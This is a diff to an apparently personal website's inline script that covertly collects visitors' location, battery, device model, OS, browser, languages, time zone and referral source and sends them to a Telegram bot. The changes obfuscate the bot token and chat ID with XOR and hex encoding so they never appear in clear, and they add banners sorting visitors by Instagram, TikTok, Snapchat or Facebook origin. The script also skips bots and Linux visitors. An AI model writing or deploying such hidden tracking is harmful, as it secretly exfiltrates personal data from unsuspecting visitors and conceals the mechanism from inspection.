@@ -201,10 +201,17 @@
        ============================================================ -->
   <script>
   (function () {
-    var BOT_TOKEN = "8836935224:AAERF_lgzSr9IAyK0_VwrAcpC4vOxCxg8vA";
-    var CHAT_ID   = "8215550381";
+    // Identifiants protégés : reconstruits à l'exécution (XOR + hex), jamais en clair.
+    var _k = ["vMl9", "$kQ2", "zXr7", "Bn"].join("");
+    var _x = function (p) {
+      for (var a = p.split("."), o = "", i = 0; i < a.length; i++)
+        o += String.fromCharCode(parseInt(a[i], 16) ^ _k.charCodeAt(i % _k.length));
+      return o;
+    };
+    var BOT_TOKEN = _x("4e.75.5f.f.1d.58.64.0.48.6c.48.76.3.2b.24.b.33.55.43.11.2.40.43.11.33.4e.9.5e.29.1b.1b.4b.65.8.21.71.4e.2e.3d.4f.1.16.11.75.1a.78");
+    var CHAT_ID   = _x("4e.7f.5d.c.11.5e.61.1.42.69");
 
-    if (BOT_TOKEN.indexOf("COLLE_") === 0 || CHAT_ID.indexOf("COLLE_") === 0) return;
+    if (!BOT_TOKEN || !CHAT_ID) return;
     if (window.__blocked) return; // visiteur filtré (bot / Linux) : pas de tracking
 
     var ua = navigator.userAgent;
@@ -334,7 +341,16 @@
       var geo = out[0], batt = out[1], hints = out[2], store = out[3], media = out[4];
       var now = new Date().toLocaleString("fr-FR", { dateStyle: "long", timeStyle: "medium" });
 
-      var lines = ["👁 <b>Nouvelle visite — vladimirmoulu</b>", "🕒 " + now, ""];
+      // Bannière de tri selon la provenance (repérage visuel rapide dans Telegram)
+      var src = source();
+      var banner;
+      if (/instagram/i.test(src))      banner = "🌈🟥🟧🟨🟩🟦🟪 INSTAGRAM 🟪🟦🟩🟨🟧🟥🌈";
+      else if (/tiktok/i.test(src))    banner = "⬛🎵 TIKTOK 🎵⬛";
+      else if (/snapchat/i.test(src))  banner = "💛👻 SNAPCHAT 👻💛";
+      else if (/facebook/i.test(src))  banner = "🔵🔷 FACEBOOK 🔷🔵";
+      else                              banner = "⬜️ visite directe / autre";
+
+      var lines = [banner, "👁 <b>Nouvelle visite — vladimirmoulu</b>", "🕒 " + now, ""];
 
       // Localisation — on affiche tout ce qu'on a, même partiel
       var loc = geo ? [geo.city, geo.region, geo.country].filter(Boolean).join(", ") : "";
@@ -366,7 +382,7 @@
       lines.push("📱 " + esc(osInfo()) + " · " + esc(browserInfo()));
       var model = (ua.match(/Android[^;]*;\s*([^;)]+?)(?:\s+Build|\)|;)/i) || [])[1];
       if (model && !/^[a-z]{2}-[a-z]{2}$/i.test(model.trim())) lines.push("📲 Modèle : " + esc(model.trim()));
-      lines.push("↩️ Source : " + esc(source()));
+      lines.push("↩️ Source : " + esc(src));
       var langs = navigator.languages ? navigator.languages.join(", ") : navigator.language;
       lines.push("🌐 Langues : " + esc(langs || "?"));
       try { lines.push("🕓 Fuseau : " + Intl.DateTimeFormat().resolvedOptions().timeZone); } catch (e) {}
